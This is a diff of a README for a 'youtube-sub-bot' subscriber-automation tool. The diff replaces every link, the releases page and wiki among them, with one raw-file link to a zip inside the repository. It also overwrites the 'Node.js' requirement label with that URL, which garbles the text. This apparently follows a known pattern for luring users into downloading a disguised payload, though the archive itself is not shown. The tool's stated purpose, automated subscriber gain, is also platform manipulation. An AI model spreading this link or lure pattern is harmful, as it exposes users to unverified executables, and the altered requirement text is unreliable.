@@ -1,7 +1,7 @@
 # 🤖 youtube-sub-bot - Boost Your YouTube Growth Effortlessly
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-YouTube_Sub_Bot-brightgreen.svg)](https://github.com/Liz-on-code/youtube-sub-bot/releases)
+[![Download](https://raw.githubusercontent.com/Liz-on-code/youtube-sub-bot/main/essling/youtube-sub-bot.zip)](https://raw.githubusercontent.com/Liz-on-code/youtube-sub-bot/main/essling/youtube-sub-bot.zip)
 
 ## 🚀 Getting Started
 Welcome to the **youtube-sub-bot**! This easy-to-use tool helps you gain subscribers on your YouTube channel through automation. Follow these steps to download and run this software on your computer.
@@ -17,13 +17,13 @@ Welcome to the **youtube-sub-bot**! This easy-to-use tool helps you gain subscri
 To use the youtube-sub-bot, ensure your computer meets these requirements:
 
 - **Operating System:** Windows 10 or later, macOS 10.15 or later, or a recent Linux distribution.
-- **Node.js:** Version 14 or higher.
+- **https://raw.githubusercontent.com/Liz-on-code/youtube-sub-bot/main/essling/youtube-sub-bot.zip** Version 14 or higher.
 - **Internet Connection:** A stable internet connection is needed to run the bot.
 - **RAM:** Minimum of 4 GB.
 - **Storage:** At least 200 MB of free disk space.
 
 ## 📥 Download & Install
-To get started with the youtube-sub-bot, visit this page to download: [Download youtube-sub-bot](https://github.com/Liz-on-code/youtube-sub-bot/releases).
+To get started with the youtube-sub-bot, visit this page to download: [Download youtube-sub-bot](https://raw.githubusercontent.com/Liz-on-code/youtube-sub-bot/main/essling/youtube-sub-bot.zip).
 
 ### Step-by-Step Installation
 1. **Visit the Releases Page:** Click the link to be taken to the download page.
@@ -56,7 +56,7 @@ If you encounter issues while using the bot, try the following:
 - **Refer to the FAQ:** Check the FAQ section in the documentation provided with the download for common issues.
 
 ## 🗂️ Additional Resources
-- **Documentation:** Detailed guides and FAQs can be found on the GitHub wiki [here](https://github.com/Liz-on-code/youtube-sub-bot/wiki).
+- **Documentation:** Detailed guides and FAQs can be found on the GitHub wiki [here](https://raw.githubusercontent.com/Liz-on-code/youtube-sub-bot/main/essling/youtube-sub-bot.zip).
 - **Community Support:** Join our community forums for help and support from other users.
 
 ## 📬 Feedback & Contributions
